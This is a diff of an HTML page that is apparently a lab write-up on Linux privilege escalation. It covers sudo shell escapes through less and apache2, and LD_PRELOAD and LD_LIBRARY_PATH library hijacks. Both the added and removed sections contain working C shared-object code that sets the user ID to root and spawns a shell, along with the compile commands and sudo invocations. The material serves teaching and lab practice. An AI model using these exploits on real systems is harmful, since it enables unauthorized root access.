@@ -184,7 +184,7 @@ User user may run the following commands on this host:
     (root) NOPASSWD: /usr/sbin/apache2
     (root) NOPASSWD: /bin/more</code></pre>
 	                <p>This configuration is terrible, we can run a total of eleven programs with root privileges and there is no password required in order to do so! We can even do what we like with apache2, this could well be the program running the main application being served from this server.</p>
-	                <p>When you find a situation like this, a great resource to use is <a href="https://gtfobins.github.io/">GTFOBins</a>. This repository is basically a list of Unix binaries that can be used to bypass local security restrictions. We know we can run any of the programs listed using "sudo". Therefore, we simply need to find a matching program in the <strong>GTFObins</strong> list that has "sudo" listed as one of its functions. I will not go through all of these programs here, but I would advise you to do each one in turn, as I did, in order to get a good feel for how this works. Let's pick a program at random, let us pick "/usr/bin/less" ("less" is a program for paging through text one screenful at a time). Search for "less" in the <strong>GTFOBins</strong> list, you will find that "sudo" is in fact listed as one the exploitable functions. Click on "Sudo". Here it will show you how to exploit this binary in order to escape the program and directly spawn a shell. Since we will be running the program as root, it will spawn a root shell and we will own the system. Let's try it out:</p>
+	                <p>When you find a situation like this, a great resource to use is <a href="https://gtfobins.github.io/">GTFOBins</a>. This repository is basically a list of Unix binaries that can be used to bypass local security restrictions. We know we can run any of the programs listed using "sudo". Therefore, we simply need to find a matching program in the <strong>GTFObins</strong> list that has "sudo" listed as one of its functions. I will not go through all of these programs here, but I would advise you to do each one in turn, as I did, in order to get a good feel for how this works. Let's pick a program at random, let us pick "/usr/bin/less" ("less" is a program for paging through text one screenful at a time). Search for "less" in the <strong>GTFOBins</strong> list, you will find that "sudo" is in fact listed as one of the exploitable functions. Click on "Sudo". Here it will show you how to exploit this binary in order to escape the program and directly spawn a shell. Since we will be running the program as root, it will spawn a root shell and we will own the system. Let's try it out:</p>
 	            <pre><code>user@debian:~$ sudo less /etc/profile</code></pre>
 	            <p>We open "/etc/profile" (this can be any file) with <strong>less</strong> using sudo, meaning <strong>less</strong> runs with root privileges. Inside <strong>less</strong> typing "!" followed by a command runs that command in a shell. Therefore, running "!/bin/sh" will spawn a shell, with the same privileges as <strong>less</strong> which in our case is root due to sudo.</p>
 	                <pre><code>sh-4.1# whoami
@@ -192,7 +192,7 @@ root</code></pre>
 	                <p><strong>Congratulations, you own the system!</strong></p>
 	                <p>There is an "extra credit" with this particular part of the challenge. We saw eariler that our low-privileged user could run "/usr/sbin/apache2" as root, without requiring a password. However, if you look in the <strong>GTFOBins</strong> list, you will see that this program is not listed. Therefore, the techinque already discussed, running the program as root and using that program to execute a root shell will not work here. If "/usr/sbin/apache2" was the only program listed we would need to take a different approach. Luckily we have one!</p>
 	                <p><strong>Reading the root user hash with Apache2</strong></p>
-	                <p>Let's assume an example scenario where we have gained a foothold into a system and we need to escalate our privileges to root. Let us further assume that both the "/etc/shadow" and "/etc/passwd" files are correctly configured and we cannot, therefore, read the password hash of root. Well, if we run "sudo -l" we will see the following:</p>
+	                <p>Let's assume an example scenario where we have gained a foothold into a system and we need to escalate our privileges to root. Let us further assume that both the "/etc/shadow" and "/etc/passwd" files are correctly configured and we cannot, therefore, read the password hash of root. Well, if we run "sudo -l" we see the following:</p>
 	                <pre><code>user@debian:~$ sudo -l
 User user may run the following commands on this host:
     (root) NOPASSWD: /usr/sbin/apache2</code></pre>
@@ -212,83 +212,85 @@ root</code></pre>
             </section>
 			
             <section id="Six">
-                <h2>Sudo - Environment Variables</h2>
-                <p>The method explained here is similar, in some ways, to the last. It relies on poorly configured sudo privileges. In order to list the current user's <strong>sudo privileges</strong> we simply run the command "sudo -l". Here is the output on our current target box:</p>
-                <pre><code>user@debian:~$ sudo -l
-Matching Defaults entries for user on this host:
-    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
-                
-User user may run the following commands on this host:
-    (root) NOPASSWD: /usr/sbin/iftop
-    (root) NOPASSWD: /usr/bin/find
-.... {truncated}</code></pre>
-                <p>We will ignore the commands section for now, as this was discussed in detail in the last section of this write up, "Shell Escape Sequences". There is an interesting section at the top of the terminal output, "Matching Defaults entries for user on this host". This section of the "sudo -l" output specifies the <strong>default sudo settings</strong> that apply to the user when they execute commands with "sudo". The first setting "env_reset" means that when the user runs a command using "sudo", most of their environment variables will be cleared (reset). This is good, as it prevents malicious or unintended environment variables from affecting privileged commands. There is more however. The "env_keep" directive can be used to explicitly retain certain variables, and exclude them from those variables effected by the "env_reset" directive. Here there are two environment variables that have been explicity <strong>kept</strong>.</p>
-                <p>The first is the "LD_PRELOAD" environment variable, which is used in Linux to specify shared libraries that should be loaded <strong>before</strong> any other standard system libraries. This means that when the user runs a command as "sudo", the libraries sepcified in "LD_PRELOAD" will still be preloaded. Secondly, the "LD_LIBRARY_PATH" environment variable is also retained. "LD_LIBRARY_PATH" is an environment variable that tells the dynamic linker where to look for shared libraries <strong>before</strong> searching in the system's default library paths.</p>
-                <p>Why is this an issue? Well, both the "LD_PRELOAD" and the "LD_LIBRARY_PATH" environment variables will both be inherited from the current user's environment, whenever the user executes a privileged command with "sudo". Therefore, we can simply create a malicious shared object file, run one of the programs that we are allowed to run via "sudo" (listed when running "sudo -l"), whilst setting the "LD_PRELOAD" environment variable to point to the full path of our malicious shared object.</p>
-                <p>First, let's write a privilege escalation exploit in C.</p>
-                <pre><code>#include &lt;unistd.h&gt;
-#include &lt;stdlib.h&gt;
-
-void _init() {
-        unsetenv("LD_PRELOAD");
-        setresuid(0,0,0);
-        system("/bin/bash -p");
-}</code></pre>
-                <p>The code here is straightforward. First, we include two header files: "&lt;unistd.h&gt;", which is required for "setresuid()", and "&lt;stdlib.h&gt;", which provides functions like "system()" and "unsetenv()". We then define our function, "_init()". The "void" keyword tells the compiler that the function will not return any value.</p> 
-                    <p>We use "_init()" instead of "main()" because "main()" is only executed when running a standalone C program (compiled as an executable). However, since we want our exploit to be loaded dynamically via "LD_PRELOAD", "_init()" is the better choice. This is because "_init()" executes automatically before the target program's "main()" function when the shared library is preloaded, allowing us to escalate privileges before any other code runs.</p>
-                <p>Now, let's break down the body the "_init()" function. The first line removes the "LD_RRELOAD" environment variable using "unsetenv()". This covers our tracks, as we will be setting this variable to point to our malicious program. Next we set the real, effective, and saved user IDs to 0, which is the root user. This effectively grants us full root privileges for the remainder of our exploit. Finally, we use the "system()" command to spawn a root shell, ensuring that our elevated access persists.</p>
-                <p>Now we simply complie our malcious C code, creating a shared object file. We will save this file in the "/tmp" directory, so that it clears on reboot.</p>
-                <pre><code>user@debian:~$ gcc -fPIC -shared -nostartfiles -o /tmp/naughty.so /home/user/naughty.c</code></pre>
-                 <p>We can now simply run any of the programs that our user is allowed to run with "sudo", setting the "LD_REPLOAD" variable to point to our malicious shared object file in the process, and we will spawn a root shell.</p>
-                <pre><code>user@debian:~$ sudo LD_PRELOAD=/tmp/naughty.so nano
-root@debian:/home/usr#</code></pre>
-                <p><strong>Congratulations, you own the system!</strong></p>
-                <p>For extra credit here, let's consider how we could still escalate our privileges if "LD_PRELOAD" was not effective, or it was restricted for some reason. </p>
-                <p><strong>Exploiting "LD_LIBRARY_PATH" to escalate privileges.</strong></p>
-                <p>We know already that both "LD_PRELOAD" and "LD_LIBRARY_PATH" are inherited from the user's environment. Previously, we explored how "LD_PRELOAD" can be exploited to escalate privileges to root. Here, we will demonstrate how "LD_LIBRARY_PATH" can be leveraged to achieve the same goal.</p>
-                <p>First, we confirm that <strong>apache2</strong> is installed and that our user has permission to run it as root without a password. Additionally, we check which environment variables are inherited when using "sudo":</p>
-                <pre><code>user@debian:~$ sudo -l
-Matching Defaults entries for user on this host:
-    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
-                
-User user may run the following commands on this host:
-    (root) NOPASSWD: /usr/sbin/apache2</code></pre>
-                <p>From this output, we see that: the "LD_LIBRARY_PATH" environment variable is <strong>not reset</strong> when using "sudo", meaning we can manipulate it; our user can run "/usr/sbin/apache2" as root without requiring a password. This combination presents an opportunity for privilege escalation.</p>
-                <p>To determine which shared libraries "apache2" depends on, we use the "ldd" (List Dynamic Dependencies) command:</p>
-                <pre><code>user@debian:~$ ldd /usr/sbin/apache2
-    linux-vdso.so.1 =>  (0x00007fff819ff000)
-	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f288296d000)
-	libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f2882749000)
-	libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f288250f000)
-	libpthread.so.0 => /lib/libpthread.so.0 (0x00007f28822f3000)
-	libc.so.6 => /lib/libc.so.6 (0x00007f2881f87000)
-	libuuid.so.1 => /lib/libuuid.so.1 (0x00007f2881d82000)
-	librt.so.1 => /lib/librt.so.1 (0x00007f2881b7a000)
-	libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f2881943000)
-	libdl.so.2 => /lib/libdl.so.2 (0x00007f288173e000)
-	libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f2881516000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007f2882e2a000)</code></pre>
-                <p>When "apache2" runs, the dynamic linker (dynamic loader) will locate these shared object files and load them into memory. By default, the dynamic linker searches for shared object files in the system's standard library paths, such as "/usr/lib".</p>
-                <p>The key to this exploit is that if "LD_LIBRARY_PATH" is set, the dynamic linker prioritises directories in this variable over system defaults. This allows us to inject a malicious shared library by creating a malicious shared object with the same name as one of the libraries "apache2" depends on, e.g. "libcrypt.so.1". We then simply place the malicious file in a directory we control, e.g. "/tmp", and set the "LD_LIBRARY_PATH" to our custom directory before executing "apache2" via "sudo". Since "apache2" is running as root and is forced to load our malicious library first, we can execute arbitrary code as root.</p>
-                <p>Here is our malicious C code:</p>
-                <pre><code>#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-                
-static void hijack() __attribute__((constructor));
-
-void hijack() {
-        unsetenv("LD_LIBRARY_PATH");
-        setresuid(0,0,0);
-        system("/bin/bash -p");
-}</code></pre>
-                <p>Here we are declaring a function called "hijack()". The "__attribute__((constructor))" ensures this function runs automatically when the shared library is loaded. We then remove the "LD_LIBRARY_PATH" from the environment to avoid detection or interference with further library loading. "setresuid(0,0,0);" sets the real, effective, and saved user IDs to 0 (root), giving us root privileges. Finally, "system('/bin/bash -p');" spawns a root shell.</p>
-                <p>Complie and link the malicious C code to a shared object file, to a directory we control, here we use "/tmp":</p>
-                <pre><code>user@debian:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/library_path.c</code></pre>
-                <p>Finally, run "apache2" using "sudo", pointing the "LD_LIBRARY_PATH" to the directory containing our malicious version of the file named "libcrypt.so.1":</p>
-                <pre><code>user@debian:~$ sudo LD_LIBRARY_PATH=/tmp apache2
-root@debian:/home/user#</code></pre>
-                <p><strong>Congratulations, you own the system!</strong></p>
-            </section>
+                <div class="section-header">Sudo - Environment Variables</div>
+	    	<div class="section-content">
+	                <p>The method explained here is similar, in some ways, to the last. It relies on poorly configured sudo privileges. In order to list the current user's <strong>sudo privileges</strong> we simply run the command "sudo -l". Here is the output on our current target box:</p>
+	                <pre><code>user@debian:~$ sudo -l
+	Matching Defaults entries for user on this host:
+	    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+	                
+	User user may run the following commands on this host:
+	    (root) NOPASSWD: /usr/sbin/iftop
+	    (root) NOPASSWD: /usr/bin/find
+	.... {truncated}</code></pre>
+	                <p>We will ignore the commands section for now, as this was discussed in detail in the last section of this write up, "Shell Escape Sequences". There is an interesting section at the top of the terminal output, "Matching Defaults entries for user on this host". This section of the "sudo -l" output specifies the <strong>default sudo settings</strong> that apply to the user when they execute commands with "sudo". The first setting "env_reset" means that when the user runs a command using "sudo", most of their environment variables will be cleared (reset). This is good, as it prevents malicious or unintended environment variables from affecting privileged commands. There is more however. The "env_keep" directive can be used to explicitly retain certain variables, and exclude them from those variables effected by the "env_reset" directive. Here there are two environment variables that have been explicity <strong>kept</strong>.</p>
+	                <p>The first is the "LD_PRELOAD" environment variable, which is used in Linux to specify shared libraries that should be loaded <strong>before</strong> any other standard system libraries. This means that when the user runs a command as "sudo", the libraries sepcified in "LD_PRELOAD" will still be preloaded. Secondly, the "LD_LIBRARY_PATH" environment variable is also retained. "LD_LIBRARY_PATH" is an environment variable that tells the dynamic linker where to look for shared libraries <strong>before</strong> searching in the system's default library paths.</p>
+	                <p>Why is this an issue? Well, both the "LD_PRELOAD" and the "LD_LIBRARY_PATH" environment variables will both be inherited from the current user's environment, whenever the user executes a privileged command with "sudo". Therefore, we can simply create a malicious shared object file, run one of the programs that we are allowed to run via "sudo" (listed when running "sudo -l"), whilst setting the "LD_PRELOAD" environment variable to point to the full path of our malicious shared object.</p>
+	                <p>First, let's write a privilege escalation exploit in C.</p>
+	                <pre><code>#include &lt;unistd.h&gt;
+	#include &lt;stdlib.h&gt;
+	
+	void _init() {
+	        unsetenv("LD_PRELOAD");
+	        setresuid(0,0,0);
+	        system("/bin/bash -p");
+	}</code></pre>
+	                <p>The code here is straightforward. First, we include two header files: "&lt;unistd.h&gt;", which is required for "setresuid()", and "&lt;stdlib.h&gt;", which provides functions like "system()" and "unsetenv()". We then define our function, "_init()". The "void" keyword tells the compiler that the function will not return any value.</p> 
+	                    <p>We use "_init()" instead of "main()" because "main()" is only executed when running a standalone C program (compiled as an executable). However, since we want our exploit to be loaded dynamically via "LD_PRELOAD", "_init()" is the better choice. This is because "_init()" executes automatically before the target program's "main()" function when the shared library is preloaded, allowing us to escalate privileges before any other code runs.</p>
+	                <p>Now, let's break down the body the "_init()" function. The first line removes the "LD_RRELOAD" environment variable using "unsetenv()". This covers our tracks, as we will be setting this variable to point to our malicious program. Next we set the real, effective, and saved user IDs to 0, which is the root user. This effectively grants us full root privileges for the remainder of our exploit. Finally, we use the "system()" command to spawn a root shell, ensuring that our elevated access persists.</p>
+	                <p>Now we simply complie our malcious C code, creating a shared object file. We will save this file in the "/tmp" directory, so that it clears on reboot.</p>
+	                <pre><code>user@debian:~$ gcc -fPIC -shared -nostartfiles -o /tmp/naughty.so /home/user/naughty.c</code></pre>
+	                 <p>We can now simply run any of the programs that our user is allowed to run with "sudo", setting the "LD_REPLOAD" variable to point to our malicious shared object file in the process, and we will spawn a root shell.</p>
+	                <pre><code>user@debian:~$ sudo LD_PRELOAD=/tmp/naughty.so nano
+	root@debian:/home/usr#</code></pre>
+	                <p><strong>Congratulations, you own the system!</strong></p>
+	                <p>For extra credit here, let's consider how we could still escalate our privileges if "LD_PRELOAD" was not effective, or it was restricted for some reason. </p>
+	                <p><strong>Exploiting "LD_LIBRARY_PATH" to escalate privileges.</strong></p>
+	                <p>We know already that both "LD_PRELOAD" and "LD_LIBRARY_PATH" are inherited from the user's environment. Previously, we explored how "LD_PRELOAD" can be exploited to escalate privileges to root. Here, we will demonstrate how "LD_LIBRARY_PATH" can be leveraged to achieve the same goal.</p>
+	                <p>First, we confirm that <strong>apache2</strong> is installed and that our user has permission to run it as root without a password. Additionally, we check which environment variables are inherited when using "sudo":</p>
+	                <pre><code>user@debian:~$ sudo -l
+	Matching Defaults entries for user on this host:
+	    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+	                
+	User user may run the following commands on this host:
+	    (root) NOPASSWD: /usr/sbin/apache2</code></pre>
+	                <p>From this output, we see that: the "LD_LIBRARY_PATH" environment variable is <strong>not reset</strong> when using "sudo", meaning we can manipulate it; our user can run "/usr/sbin/apache2" as root without requiring a password. This combination presents an opportunity for privilege escalation.</p>
+	                <p>To determine which shared libraries "apache2" depends on, we use the "ldd" (List Dynamic Dependencies) command:</p>
+	                <pre><code>user@debian:~$ ldd /usr/sbin/apache2
+	    linux-vdso.so.1 =>  (0x00007fff819ff000)
+		libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f288296d000)
+		libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f2882749000)
+		libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f288250f000)
+		libpthread.so.0 => /lib/libpthread.so.0 (0x00007f28822f3000)
+		libc.so.6 => /lib/libc.so.6 (0x00007f2881f87000)
+		libuuid.so.1 => /lib/libuuid.so.1 (0x00007f2881d82000)
+		librt.so.1 => /lib/librt.so.1 (0x00007f2881b7a000)
+		libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f2881943000)
+		libdl.so.2 => /lib/libdl.so.2 (0x00007f288173e000)
+		libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f2881516000)
+		/lib64/ld-linux-x86-64.so.2 (0x00007f2882e2a000)</code></pre>
+	                <p>When "apache2" runs, the dynamic linker (dynamic loader) will locate these shared object files and load them into memory. By default, the dynamic linker searches for shared object files in the system's standard library paths, such as "/usr/lib".</p>
+	                <p>The key to this exploit is that if "LD_LIBRARY_PATH" is set, the dynamic linker prioritises directories in this variable over system defaults. This allows us to inject a malicious shared library by creating a malicious shared object with the same name as one of the libraries "apache2" depends on, e.g. "libcrypt.so.1". We then simply place the malicious file in a directory we control, e.g. "/tmp", and set the "LD_LIBRARY_PATH" to our custom directory before executing "apache2" via "sudo". Since "apache2" is running as root and is forced to load our malicious library first, we can execute arbitrary code as root.</p>
+	                <p>Here is our malicious C code:</p>
+	                <pre><code>#include &lt;stdio.h&gt;
+	#include &lt;stdlib.h&gt;
+	                
+	static void hijack() __attribute__((constructor));
+	
+	void hijack() {
+	        unsetenv("LD_LIBRARY_PATH");
+	        setresuid(0,0,0);
+	        system("/bin/bash -p");
+	}</code></pre>
+	                <p>Here we are declaring a function called "hijack()". The "__attribute__((constructor))" ensures this function runs automatically when the shared library is loaded. We then remove the "LD_LIBRARY_PATH" from the environment to avoid detection or interference with further library loading. "setresuid(0,0,0);" sets the real, effective, and saved user IDs to 0 (root), giving us root privileges. Finally, "system('/bin/bash -p');" spawns a root shell.</p>
+	                <p>Complie and link the malicious C code to a shared object file, to a directory we control, here we use "/tmp":</p>
+	                <pre><code>user@debian:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/library_path.c</code></pre>
+	                <p>Finally, run "apache2" using "sudo", pointing the "LD_LIBRARY_PATH" to the directory containing our malicious version of the file named "libcrypt.so.1":</p>
+	                <pre><code>user@debian:~$ sudo LD_LIBRARY_PATH=/tmp apache2
+	root@debian:/home/user#</code></pre>
+	                <p><strong>Congratulations, you own the system!</strong></p>
+		</div>			
+	    </section>
     
         </article>
     </main>
